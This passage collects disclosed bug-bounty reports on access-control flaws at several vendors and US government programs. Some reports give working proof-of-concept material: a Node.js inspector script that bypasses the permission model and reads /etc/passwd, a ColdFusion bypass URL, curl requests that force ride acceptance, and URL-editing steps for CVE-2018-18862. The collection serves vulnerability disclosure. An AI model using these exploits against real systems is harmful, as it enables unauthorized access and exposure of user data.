This finding has a huge impact on the application, including data loss, service disruption, unauthorized actions, data privacy concerns, security risks, and potential reputation damage.

---

### [User automatically logged in as Sys Admin user on https://███/Administration/Administration.aspx](https://hackerone.com/reports/2190808)

- **Report ID:** `2190808`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @mrr0b0t2324
- **Bounty:** - usd
- **Disclosed:** 2023-11-03T17:15:45.291Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
Any user can access the Administration section of the following URL: https://███
When the user goes to the following domain they are automatically logged in as "████████" which is a sys admin user on the application, this allows any user to upload files, add users, change permissions for users and delete users.

## References

## Impact

A malicious actor can modify other user's privileges on the application, add users, upload files, delete users. They can also add false information to the application which will jeopardize the integrity of the application. With administrator privileges they have no restrictions on the application.

## System Host(s)
https://█████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Step 1) Go to the following URL: https://███ 
There you will se that you are logged in as a Sys Admin user

## Suggested Mitigation/Remediation Actions
The application should prompt a user to authenticate first before being able to do any other actions on the system.

---

### [CVE-2023-30587 Process-based permissions can be bypassed with the "inspector" module.](https://hackerone.com/reports/2078581)

- **Report ID:** `2078581`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Internet Bug Bounty
- **Reporter:** @mattaustin
- **Bounty:** 3495 usd
- **Disclosed:** 2023-09-30T19:10:26.940Z
- **CVE(s):** CVE-2023-30587

**Vulnerability Information:**

[https://hackerone.com/reports/1962701](https://hackerone.com/reports/1962701)  Restrictions set with the new process based permission flag can by bypassed with the built-in inspector module.

## Impact

Permission Model is a mechanism for restricting access to specific resources during execution. This bypasses those restrictions.

**Summary (team):**

###Inspector protocol bypass the experimental permission model (High) (CVE-2023-30587)

A vulnerability in Node.js version 20 allows for bypassing restrictions set by the --experimental-permission flag using the built-in inspector module (node:inspector).

By exploiting the Worker class's ability to create an "internal worker" with the kIsInternal Symbol, attackers can modify the isInternal value when an inspector is attached within the Worker constructor before initializing a new WorkerImpl.

This vulnerability exclusively affects Node.js users employing the permission model mechanism in Node.js 20.

Please note that at the time this CVE was issued, the permission model is an experimental feature of Node.js.

---

### [Permanent CASB Integration Takeover due to Improper Access Controls+Confused Deputy Problem](https://hackerone.com/reports/2086301)

- **Report ID:** `2086301`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Cloudflare Public Bug Bounty
- **Reporter:** @matured_kazama
- **Bounty:** - usd
- **Disclosed:** 2023-09-18T12:28:03.428Z
- **CVE(s):** -

**Summary (team):**

Cloudflare's Cloud Access Security Broker (CASB) had a security vulnerability on a limited set of integrations, known as the "confused deputy problem." If an attacker managed to discover a valid Microsoft tenant UUID or Microsoft domain, GitHub or BOX's installation_id that a previous Cloudflare CASB customer had once connected but later removed, they could potentially exploit this to add a new integration to their account. This could have allowed the attacker to access sensitive information from CASB's findings for those integrations. However, Cloudflare's CASB engineering team acted swiftly to address this issue and eliminate the potential for such an attack. Additionally, an internal investigation found no evidence of customer data being impacted, except for the accounts used by the researcher who reported the vulnerability.

**Summary (researcher):**

Cloudflare CASB lacked backend-validations which allowed an attacker to takeover deleted Github, Microsoft & BOX integrations, which might contains organization specific sensitive data, by just enumerating the applications enterprise ids or tenant_ids.

---

### [2FA BYPASS](https://hackerone.com/reports/1805779)

- **Report ID:** `1805779`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Cloudflare Public Bug Bounty
- **Reporter:** @imtheking
- **Bounty:** - usd
- **Disclosed:** 2023-09-18T12:25:23.427Z
- **CVE(s):** -

**Summary (team):**

Cloudflare's Dashboard enables users to configure 2-Factor Authentication using a Security Key. An issue in the authentication system allowed for the retrieval of recovery codes (used to regain account access if the security key is lost) after verifying the username and password but before completing the authentication process by touching the Security Key. Cloudflare's Engineering team resolved the issue by disallowing requests to the vulnerable API endpoint until users are fully authenticated.

**Summary (researcher):**

X
tt

---

### [Adobe ColdFusion - Access Control Bypass [CVE-2023-38205] at ██████](https://hackerone.com/reports/2082528)

- **Report ID:** `2082528`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @hacker1_agent
- **Bounty:** - usd
- **Disclosed:** 2023-09-08T17:12:14.348Z
- **CVE(s):** CVE-2023-38205

**Vulnerability Information:**

Hello Gents, I would like to report an issue where attackers are able to bypass the product feature that restricts external access to the ColdFusion Administrator. [CVE-2023-38205] at `██████`



## Steps to reproduce
+ Please open the following link:

> https://█████████/hax/..CFIDE/wizards/common/utils.cfc?method=wizardHash&inPassword=foo&_cfclient=true&returnFormat=wddx

## Proof of concept

+ ████

## Impact

Access Control Bypass.

Thanks and have a nice day!

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
+ Please open the following link:

> https://████████/hax/..CFIDE/wizards/common/utils.cfc?method=wizardHash&inPassword=foo&_cfclient=true&returnFormat=wddx

## Suggested Mitigation/Remediation Actions

---

### [New AppPassword can be generated without password confirmation](https://hackerone.com/reports/2067572)

- **Report ID:** `2067572`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Nextcloud
- **Reporter:** @mikaelgundersen
- **Bounty:** 250 usd
- **Disclosed:** 2023-08-10T07:20:18.566Z
- **CVE(s):** CVE-2023-39963

**Vulnerability Information:**

There is protection on https://github.com/nextcloud/server/blob/master/apps/settings/lib/Controller/AuthSettingsController.php#L122 that you must have recently entered your password to be able to generate a new AppPassword. However if an attacker would obtain access to your system (say you forgot to lock it when taking a quick bathroom break).

They can abuse a route to just obtain this. ```https://SERVER/ocs/v2.php/core/getapppassword```
Probably without you ever noticing.

## Impact

The password confirmation to generate an app password is effectively useless as it is trivial to bypass.

**Summary (team):**

Security advisory at https://github.com/nextcloud/security-advisories/security/advisories/GHSA-j4qm-5q5x-54m5

---

### [Process-based permissions can be bypassed with the "inspector" module.  ](https://hackerone.com/reports/1962701)

- **Report ID:** `1962701`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Node.js
- **Reporter:** @mattaustin
- **Bounty:** - usd
- **Disclosed:** 2023-07-20T20:58:32.838Z
- **CVE(s):** CVE-2023-30587

**Vulnerability Information:**

**Summary:**

Restrictions made with with the --experimental-permission flag can by bypassed with the built-in inspector module. 

**Description:** 

The Worker class  can take an argument (the kIsInternal Symbol) to create an "internal worker" which does not respect the process level restrictions. 

We cant access this Symbol('kIsInternal'); directly, however the [inspector module](https://nodejs.org/api/inspector.html) is not disabled when process level restrictions are in place.  "The node:inspector module provides an API for interacting with the V8 inspector."

If we attach inspector inside the Worker constructor before `new WorkerImpl` is created we can simply change the value of "isInternal". 

## Steps To Reproduce:

1. Create the following `bypass.js` file: 

```javascript
const { Session } = require('node:inspector/promises');

const session = new Session();
session.connect();

(async ()=>{
	await session.post('Debugger.enable');
	await session.post('Runtime.enable');

	global.Worker = require('node:worker_threads').Worker;
	
	let {result:{ objectId }} = await session.post('Runtime.evaluate', { expression: 'Worker' });
	let { internalProperties } = await session.post("Runtime.getProperties", { objectId: objectId });
	let {value:{value:{ scriptId }}} = internalProperties.filter(prop => prop.name == '[[FunctionLocation]]')[0];
	let { scriptSource } = await session.post("Debugger.getScriptSource", { scriptId });

	// find the line number where WorkerImpl is called. 
	const lineNumber = scriptSource.substring(0, scriptSource.indexOf("new WorkerImpl")).split('\n').length;

	// WorkerImpl will bypass permission for internal modules. We can inject the local var "isInternal = true" with a conditional breakpoint.
	await session.post("Debugger.setBreakpointByUrl", {
		lineNumber: lineNumber,
		url: "node:internal/worker",
		columnNumber: 0,
		condition: "((isInternal = true),false)"
	});

	new Worker(`
		const child_process = require("node:child_process");
		console.log(child_process.execSync("ls -l").toString());
		
		console.log(require("fs").readFileSync("/etc/passwd").toString())
	`, {
		eval: true,
		execArgv: [
			"--experimental-permission",
			"--allow-fs-read=*",
			"--allow-fs-write=*",
			"--allow-child-process",
			"--no-warnings"
		]
	});

})()
```

2. Run the following command :

``` bash
node --experimental-permission --allow-fs-read=$(pwd) bypass.js
```
---
If the policies were not bypassed we would expect to see something like: 

```
node --experimental-permission --allow-fs-read=$(pwd) safe.js
node:internal/child_process:1103
  const result = spawn_sync.spawn(options);
                            ^

Error: Access to this API has been restricted
``` 

## Supporting Material/References:
In my opinion inspector should be allowed when process level permissions are being enforced. 
I noticed there was already a flag: EnvironmentFlags::kNoCreateInspector. I took a shot at patching this  out unless ==inspect or --inspect-brk were used, but I didn't know if a more direct options like "--allow-inspector" would be preferred. 

  ``` diff
diff --git a/src/env.cc b/src/env.cc
index 571a8ed5ce..b5b7557bd1 100644
--- a/src/env.cc
+++ b/src/env.cc
@@ -791,6 +791,11 @@ Environment::Environment(IsolateData* isolate_data,
     // spawn/worker nor use addons unless explicitly allowed by the user
     if (!options_->allow_fs_read.empty() || !options_->allow_fs_write.empty()) {
       options_->allow_native_addons = false;
+      DebugOptions debug_options;
+      debug_options = options_->debug_options();
+      if (!debug_options.inspector_enabled || !debug_options.break_first_line) {
+        flags_ = flags_ | EnvironmentFlags::kNoCreateInspector;
+      }
       if (!options_->allow_child_process) {
         permission()->Apply("*", permission::PermissionScope::kChildProcess);
       }
```

## Impact

Permission Model is a mechanism for restricting access to specific resources during execution. This bypasses those restrictions.

---

### [Rider can forcefully get passenger's order accepted resulting in multiple impacts including PII reveal  and more mentioned in the report.](https://hackerone.com/reports/1960107)

- **Report ID:** `1960107`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** inDrive
- **Reporter:** @spongebhav
- **Bounty:** - usd
- **Disclosed:** 2023-06-28T09:21:05.689Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hello Indrive Security Team,
This is going to be chain of attacks with major flow being in /api/setTenderStatus request allowing the attacker to get their ride request accepted automatically.

## Steps To Reproduce:

1st major vulnerability:
// Forcefully getting the passenger to accept the ride

### Section 1

1. Whenever a rider/driver offers the passenger their price there is a request that is sent to /api/driverrequest

█████

2. Now after getting the tenderID and OrderID from that request, the rider sends the request in /api/setTenderStatus in this format

█████████

Here the orderID and tenderID is from step 1.

3. The ride gets accepted.



The impact for this is "The rider can get details of any passenger, this includes phone number of passengers. Even when the passenger doesn't accept the riders offer."
Please keep in mind that this can be automated in real time to make this attack more efficien.

2nd Chain vulnerability:
// Chose a out of range price

### Section 2

1. This request is sent when the rider bids his price: 

██████████

2. The rider can modify the price range to be of a much higher value than that.
3. Resulting in sending a bid that is significantly more

// Combining this with above vulnerability we can get passenger to forcefully accept the ride of the customer.



==Provide the request in curl format, if possible==

For vuln A:

```
curl https://terra-akamai.indriverapp.com/api/setTenderStatus?cid=5957&locale=en_US&phone=████&token=████████&v=7&stream_id=1682280490209367&tender_id=████████&order_id=█████████&status=accept
```

For vuln B:

```
curl https://terra-akamai.indriverapp.com/api/driverrequest?cid=5957&locale=en_US&job_id=338f72ff-f3c1-4da0-af15-5d1aa720146b&phone=██████████&token=████████&v=7&stream_id=1682279074257167&order_id=██████&client_id=█████████&shield_session_id=██████████&type=indriver&price=63&period=3&geo_arrival_time=1&distance=5&longitude=85.3249627&latitude=27.7390611&sn=1
```



Thank you so much.
Let me know if you need any further help in reproducing this issue.
@spongebhav

## Impact

1. Revealing PII of customers even if customer didn't accept the rider's request.
2. Making customer accept a bid that is significantly higher tricking the customer into giving more money.

**Summary (team):**

A vulnerability was found in a customer order flow that allowed a driver to accept an order on behalf of a passenger. This vulnerability allowed the driver to set the ride price by force bypassing the built-in ride price calculation algorithm, where the passenger and the driver negotiate the fare based on their preferences.

---

### [' Full Account Takeover ' at █████](https://hackerone.com/reports/1959540)

- **Report ID:** `1959540`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** Mars
- **Reporter:** @0xs4m
- **Bounty:** - usd
- **Disclosed:** 2023-06-23T14:56:01.509Z
- **CVE(s):** -

**Summary (team):**

A severe vulnerability is identified in the login functionality of a website belonging to Mars. An unauthorized actor can manipulate the server's response from the █████████████ endpoint to gain unauthorized access to any user account on the platform, leading to a full account takeover. The attacker can achieve this by intercepting the login request, modifying the server's response to indicate a successful login, and setting a cookie with the target user's ID. This exploit does not require knowledge of the victim's email address or password.

---

### [End-to-end encrypted file-drops can be made inaccessible](https://hackerone.com/reports/1914115)

- **Report ID:** `1914115`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Nextcloud
- **Reporter:** @rullzer
- **Bounty:** 400 usd
- **Disclosed:** 2023-06-22T06:13:57.173Z
- **CVE(s):** CVE-2023-35173

**Vulnerability Information:**

Assume a filedrop that is send to 2 people, USER and ATTACKER

1. user uploads their E2EE encrypted fileA into the filedrop
2. All goes well
3. Now ATTACKER comes along and wants mess up the upload from USER
4. They obtain the metadatafile
5. They modify the entry in the filedrop list that USER created
6. They upload their new metadatafile
7. Unlock it
8. FileA is now not able to be decoded at all anymore.

## Impact

The CIA model (Confidentiality, integrity and availability) is here very easy to break. An attacker can almost trivially in this case break the availability.
Note that due to the nature of providing the metadatafile an attacker can trivially know if there are other filedrop files.

To solve
1. Do not provide the metadata file to the user in file drop at all
2. Only send back the new entry (which they can create without the metadatafile)
3. Append the new entry in the backend code.

**Summary (team):**

Security advisory at https://github.com/nextcloud/security-advisories/security/advisories/GHSA-x7c7-v5r3-mg37

---

### [Leaks of username and password leads to CVE-2018-18862 exploitation](https://hackerone.com/reports/1990338)

- **Report ID:** `1990338`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @pll25
- **Bounty:** - usd
- **Disclosed:** 2023-06-02T18:19:38.611Z
- **CVE(s):** CVE-2018-18862

**Vulnerability Information:**

Hi DoD Team, 
I hope you are doing good today.

This is a follow-up from my  November 15th 2022 report number #1775217 (https://hackerone.com/reports/1775217)
In all respect and to be clear, I don't want to push too hard or be annoying on this and feel free to tell me if you don't want or need to take action on this.

Since my report #1775217 was left un-answered I felt I should open a new one since I feel this is serious matter.

>>Recap of my last report : 
>>On November 15th 2022: I opened a report describing how I've found a set of credential publicly exposed from an ITSM system indexed in search engines.
>> On November 16th 2022 :I had a reply telling me that the credentials were valid but didn't have any rights on the system so there was no impact.
>> On November 17th2022 :  I had found another set of credentials exposed and I was able to successfully exploit CVE-2018-18862 from this.
>>This was left un-answered.
>>On February 12th 2023: The website was down and I left my report as such.
>>See : https://hackerone.com/reports/1775217 for all the details.


Today, to my surprise and while doing other searches I stumbled accross this website again.
I would like to reiterate the following : 


>Today, May 16th 2023, the set of Credentials I had found at the time are still working :
>>**Username:** ████
>>**Password:** ███

>>**Username:** ████████
>>**Password:** ██████████

See screenshot 3, taken on May 16th 2023, the "█████████" credentials are still exposed.
█████

Here is the login page : https://████████/███████/shared/login.jsp
 
Today, May 16th 2023, I can still successfully exploit **CVE-2018-18862 - Incorrect access control**.

I decided to re-open the report for the following reasons : 
-I thought about it a long time, since on my prior report I didn't have any reply after the successful CVE exploitation and the new set of credentials found I judged it was worth having a 2nd look.
-Also, I thought the system was down but today I found out it was not.


In all good faith.
Best regards.


~pll25


## References
https://nvd.nist.gov/vuln/detail/CVE-2018-18862

## Impact

-An attacker can access the system with the rights of these users.
-I was able to list Roles. 
-I am potentially able to create/read reports and probably do more but I stopped there because the POC is already proven.
-2 sets of credentials including valid username and passwords were leaked from this system on November 15th 2022.

## System Host(s)
https://███████

## Affected Product(s) and Version(s)
BMC Remedy version unknown

## CVE Numbers
CVE-2018-18862 - (CVSS V3.0 Score : 8.8 (HIGH), Vector: /AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H).

## Steps to Reproduce
**Step 1:** 
Let's say we use the account "██████████". 
Login with the username and password on this page : https://██████/███/shared/login.jsp 
(ScreenShot 1 from November 15th describes how I was able to obtain it).
███

**Step 2 :** 
 You should land on an Error web page telling that the file doesn't exist.
The landing URL should look like this : 
>>███████/█████/forms/arpcp/**arpc:web:retirementsapplicationsubmission/default+administrator+view/$external%20report%20server%20url_glb$retirementapplication&rs:command=render&preportinstanceid=$536871212$&rs:format=pdf**

**Step 3 :** 
Here we can exploit CVE-2018-18862 : replace all the text after : /forms/arpc/ (the part of the URL in bold above) with :
>>/User/Default+Admin+View1/

**Step 4:** 
You will now have access to the whole Remedy ITSM system.
From there you have successfully exploited CVE-2018-18862.

I was able to list Roles. 
I am potentially able to create/read reports and probably do more but I stopped there because the POC is already proven.

## Suggested Mitigation/Remediation Actions
- Change affected passwords. 
- MIgrate the system to a new un-affected version.
- Apply the vendor work-arounds if possible.

---

### [LDAP Server NULL Bind Connection Information Disclosure](https://hackerone.com/reports/1937235)

- **Report ID:** `1937235`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @0xmaruf
- **Bounty:** - usd
- **Disclosed:** 2023-05-15T15:07:05.908Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
The remote LDAP server allows anonymous access

## References
  - https://www.tenable.com/plugins/nessus/10723
  - https://ldap.com/ldapv3-wire-protocol-reference-bind

## Impact

information  disclosure

## System Host(s)
████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. run $ `nmap -n -sV --script "ldap* and not brute" -p 389 ██████████`

check the response
## POC
██████

## Suggested Mitigation/Remediation Actions
Configure the service to disallow NULL BINDs.

---

### [Reset password link sent over unsecured http protocol](https://hackerone.com/reports/1888915)

- **Report ID:** `1888915`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Mattermost
- **Reporter:** @uchihaluckycs
- **Bounty:** 750 usd
- **Disclosed:** 2023-05-10T08:53:31.726Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
After creating the workspace, if victim clicks on forgot password then reset password link has been generated and sent over mail and that password link is unsecured http protocol.

## Steps To Reproduce:

  1. Signup to a workspace
  2. Navigate to https://h1-\*your-own-instance\*.cloud.mattermost.com/reset_password and enter signup email
  3. Check email, you will get reset passwork link. {F2201387}
  4. Copy that link paste in notepad and observe the protocol. {F2201388}

## Mitigation:
Generate reset password link with secured https protocol.

## Impact

If the victim opens the reset password link and forgot to update the password, anyone from intermediate computers through network or sniffer can reset the password.

---

### [Authentication bypass on gist.github.com through SSH Certificates](https://hackerone.com/reports/1901040)

- **Report ID:** `1901040`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** GitHub
- **Reporter:** @ammar2
- **Bounty:** 10000 usd
- **Disclosed:** 2023-04-20T20:41:04.688Z
- **CVE(s):** CVE-2023-23761

**Summary (team):**

An improper authentication vulnerability was identified in GitHub Enterprise Server that allowed an unauthorized actor to modify other users' secret gists by authenticating through an SSH certificate authority. To do so, a user had to know the secret gist's URL. This vulnerability affected all versions of GitHub Enterprise Server prior to 3.9 and was fixed in versions 3.4.18, 3.5.15, 3.6.11, 3.7.8, and 3.8.1. This vulnerability was reported via the GitHub Bug Bounty program.

**Summary (researcher):**

Github supports [SSH certificate authority authentication](https://docs.github.com/en/enterprise-cloud@latest/organizations/managing-git-access-to-your-organizations-repositories/about-ssh-certificate-authorities) for Github Enterprise Cloud customers. As part of certificate authority authentication, the certificate contains a `extension:login@github.com=username` corresponding to which username from the organization to authenticate as.

Due to a missed check in the gist.github.com authentication flow, an attacker could create a certificate giving them access to push to any username's gists.


----

Minor correction on the vendor description, it's not just secret gists that were at risk. An attacker could have pushed changes to a user's public gists as well.

---

### [A malicious actor could rotate tokens of a victim, given that he knows the victim's token ID](https://hackerone.com/reports/1525309)

- **Report ID:** `1525309`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Cloudflare Public Bug Bounty
- **Reporter:** @esx
- **Bounty:** - usd
- **Disclosed:** 2023-04-13T12:51:40.457Z
- **CVE(s):** -

**Summary (team):**

Due to lack of proper authorization checks a malicious actor was able to rotate API token of a different user using the Roll Token API method leading to DoS for the token owner and the applications that use it. Exploitation of this vulnerability required prior knowledge of the victim's token ID (in UUID format).
The fix was released by Cloudflare Engineering enforcing proper access controls for this endpoint.

---

### [Accessing unauthorized administration pages and seeing admin password - speakerkit.state.gov](https://hackerone.com/reports/1806387)

- **Report ID:** `1806387`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Department of State
- **Reporter:** @qualw1n
- **Bounty:** - usd
- **Disclosed:** 2023-03-25T13:44:22.594Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
- I discovered an issue referred to as no-redirect in a subdomain on state.gov.
When you enter the page, it directs you directly to the entrance. When I examined it via burp suite, it gave 302 found, but the homepage data was showing below.
When I tried it as admin, it still gave 302 found, but this time we could see the content of the admin page.
this way i was able to see admin user and normal user's info.
I was also able to perform many transactions.
uploading files, adding categories and many more.

## Steps To Reproduce:
1- Login to https://speakerkit.state.gov/
- and it will throw you to the page named "spklogin". Using the find and replace feature on burpsuite, I told it to change all requests that gave 302 found to 200 Ok, and I easily performed my operations.
You will be able to do it when you watch the video.

## Supporting Material/References:
https://hackerone.com/reports/1026146
https://hackerone.com/reports/95441

  * [attachment / reference]

{F2078131}
{F2078132}
{F2078133}

* [ poc / video]
████████

## Impact

access the admin page. unauthorized.

---

### [Argo CD reconciles apps outside configured namespaces when sharding is enabled](https://hackerone.com/reports/1847140)

- **Report ID:** `1847140`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Internet Bug Bounty
- **Reporter:** @czchen
- **Bounty:** 2000 usd
- **Disclosed:** 2023-03-05T16:49:51.098Z
- **CVE(s):** CVE-2023-22736

**Vulnerability Information:**

The Application CRD outside configured namespace in Argo CD will be reconciled.

The following is how to reproduce the vulnerability:

* Enable `apps-in-any-namespace` and `sharding` features.
* Create an Application CRD in namespace not configured in Argo CD.
* Update the Application CRD, and Argo CD will reconcile the Application CRD, despite not in configured namespace.

## Impact

Attacker can use Argo CD permission to deploy resources in Kubernetes.

**Summary (team):**

Controller reconciles apps outside configured namespaces when sharding is enabled

Impact
All Argo CD versions starting with 2.5.0-rc1 are vulnerable to an authorization bypass bug which allows a malicious Argo CD user to deploy Applications outside the configured allowed namespaces.

Description of exploit
Reconciled Application namespaces are specified as a comma-delimited list of glob patterns. When sharding is enabled on the Application controller, it does not enforce that list of patterns when reconciling Applications. For example, if Application namespaces are configured to be argocd-*, the Application controller may reconcile an Application installed in a namespace called other, even though it does not start with argocd-.

Reconciliation of the out-of-bounds Application is only triggered when the Application is updated, so the attacker must be able to cause an update operation on the Application resource.

Credits
Thanks to ChangZhuo Chen (@czchen) for finding the issue and for contributing the fix!

Full GHSA: https://github.com/argoproj/argo-cd/security/advisories/GHSA-6p4m-hw2h-6gmw

---

### [Upload and delete files in debug page without access control.](https://hackerone.com/reports/1714767)

- **Report ID:** `1714767`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @0r10nh4ck
- **Bounty:** - usd
- **Disclosed:** 2023-02-24T18:40:53.460Z
- **CVE(s):** -

**Vulnerability Information:**

I found a debug page with no access control that allows:
- Uploading files.
- Reading files if they are in JSON format.
- Delete files.

## Impact

- Insufficient access control.
- An attacker can delete files exposed by the application.

## System Host(s)
████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
## For upload file:
1. Use a browser to navigate to: https://█████/debug. 
2. Click on choose file button.
3. Set the file path in the location field
4. Click on the upload files button.
5.See the file uploaded on the list.

## For Read File
1. Select the file.
2. Click and Read File Content.
3. See the content file.

## For delete file:
1. Select the file.
2. Click on the Delete ENC Files button.

## Suggested Mitigation/Remediation Actions
- Implement access control on the page.

---

### [Low authorization level at server side API operation e2e.updateGroupKey, let an attacker break the E2E architecture.](https://hackerone.com/reports/1757663)

- **Report ID:** `1757663`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Rocket.Chat
- **Reporter:** @f0ns1
- **Bounty:** - usd
- **Disclosed:** 2023-02-16T22:19:11.710Z
- **CVE(s):** CVE-2023-23911

**Summary (team):**

During my personal revision of the E2E encryption feature enable by default at open.rocket.chat server, that allow users to encrypt messages under application layer inside on a specific secure chat room, I found the following vulnerability:
It's possible to break the E2E encryption of a secure chat room. The root cause of the vulnerability is the server side API operation e2e.updateGroupKey.
This operation as you should know is in charged to insert or update the E2EKey on the rocketchat_subscription table on the server Database non-relational (MongoDB).
The rocketchat_subscription collection, contains for each user that belong to an existing encrypted chat room, an entry with the E2EKey. This E2EKey is an Asymmetric encrypted base64 data with RSA that use the public_key value stored on the user collection for an specific user, for encrypting the room-key. This room-key is used to encrypt and decrypt with symmetric AES algorithm the messages stored for the in the server database, for the specific secure chat.

---

### [connect.8x8.com: admin user can send invites on behalf of another admin user via POST /api/v1/users/<User ID>/invites](https://hackerone.com/reports/1474536)

- **Report ID:** `1474536`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** 8x8
- **Reporter:** @emperor
- **Bounty:** - usd
- **Disclosed:** 2023-02-15T07:48:12.281Z
- **CVE(s):** -

**Summary (team):**

@emperor reported to us a vulnerability allowing admin users to send invites on behalf of another admin.
The same behaviour was later utilised to invite admins under the `User Management` role (which should have been restricted).
Our team put additional Access Control checks in place, which resolved the issue.

---

### [connect.8x8.com: deactivated users remain access to /api/v1/users/UUID/roles](https://hackerone.com/reports/1473071)

- **Report ID:** `1473071`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** 8x8
- **Reporter:** @emperor
- **Bounty:** - usd
- **Disclosed:** 2023-02-15T07:27:12.309Z
- **CVE(s):** -

**Summary (team):**

@emperor & @sharp488 reported to us a scenario where deactivated users remain access to `/api/v1/users/UUID/roles` within their own tenant.
Our team utilised the insights from this report to work on additional access control protections, which resolved the reported issues.

---

### [jaas.8x8.vc: Removed users can still have READ/WRITE access to the workspace via different API endpoints](https://hackerone.com/reports/1479894)

- **Report ID:** `1479894`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** 8x8
- **Reporter:** @emperor
- **Bounty:** - usd
- **Disclosed:** 2023-02-15T06:51:30.935Z
- **CVE(s):** -

**Summary (team):**

@emperor observed an `Improper Access Control` issue specific to "removed" users & insufficient session revocation.
When a user was deleted/removed from the workspace (but for some reason, she was logged in JaaS & saved her session cookies), she could still perform certain actions on behalf of the workspace.

*PoC / Steps to reproduce*:
**Step1**: Login to your administrator account via https://jaas.8x8.vc/
**Step2**: Click on "Invite teammates" and add a "user".
**Step3**: View and accept the Invitation received via email and set up your account
**Step4**: Now from that account just perform any action to get cookie
**Step5**: Now go to the main user account and remove this invited user.
**Step6**: Observed that removed users can still have READ/WRITE access to the workspace.

The team applied a fix to the session management, which resolved the issue.

---

### [admin.8x8.vc: Member users with no permission can integrate email to connect calendar via GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?..](https://hackerone.com/reports/1486310)

- **Report ID:** `1486310`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** 8x8
- **Reporter:** @emperor
- **Bounty:** - usd
- **Disclosed:** 2023-02-15T06:35:41.593Z
- **CVE(s):** -

**Vulnerability Information:**

Dear Team,

Greetings!!!

I have observed an Improper access control Issue. Member users do not have permission to rooms area of the admin section. But member users can exploit this via GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=https%3A%2F%2Fadmin.8x8.vc%2F%23%2Frooms%2Fadd HTTP/2

Steps to reproduce
**Step1**: Member users do not have access to the room's area.
Use {F1625870}

**Step2**: Admin users can add their email to sync calendars from this area.
Use {F1625869}

**Step3**: From member user's JWT send a request to below endpoint
Use ██████

```
GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=https%3A%2F%2Fadmin.8x8.vc%2F%23%2Frooms%2Fadd HTTP/2
Host: admin.8x8.vc
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://admin.8x8.vc/
Content-Type: application/json
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close
Authorization: <Member user's JWT>
```

**Step4**: You will receive the Link as below from the above endpoint: 
```
{"url":"https://app.cronofy.com/oauth/authorize?response_type=code&client_id=M0wBDPDXk6EQLaGCqp-pTN_VGt7_AtM9&redirect_uri=https://api-vo.jitsi.net/rosy/sso/cronofy/callback&scope=read_only&delegated_scope=read_only&state=███████&avoid_linking=true"}
```

**Step5**: Now use this link and complete the OAuth sign up. (There is no validation and the application will allow you to add your email)
Use {F1625872}

**Step6**: Member user successfully added his/her email into admin's room area
Use ███

Best regards,
Emperor

## Impact

- Member users with no permission can integrate email to connect calendar

---

### [Github Apps can use Scoped-User-To-Server Tokens to Obtain Full Access to User's Projects in Project V2 GraphQL api](https://hackerone.com/reports/1711938)

- **Report ID:** `1711938`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** GitHub
- **Reporter:** @ahacker1
- **Bounty:** - usd
- **Disclosed:** 2023-01-26T14:06:20.581Z
- **CVE(s):** CVE-2022-23739

**Summary (team):**

An incorrect authorization vulnerability was identified in GitHub Enterprise Server, allowing for escalation of privileges in GraphQL API requests from GitHub Apps. This vulnerability allowed an app installed on an organization to gain access to and modify most organization-level resources that are not tied to a repository regardless of granted permissions, such as users and organization-wide projects. Resources associated with repositories were not impacted, such as repository file content, repository-specific projects, issues, or pull requests. This vulnerability affected all versions of GitHub Enterprise Server prior to 3.7.1 and was fixed in versions 3.3.16, 3.4.11, 3.5.8, 3.6.4, 3.7.1. This vulnerability was reported via the GitHub Bug Bounty program.

---

### [1 click Account takeover via deeplink in [com.kayak.android]](https://hackerone.com/reports/1667998)

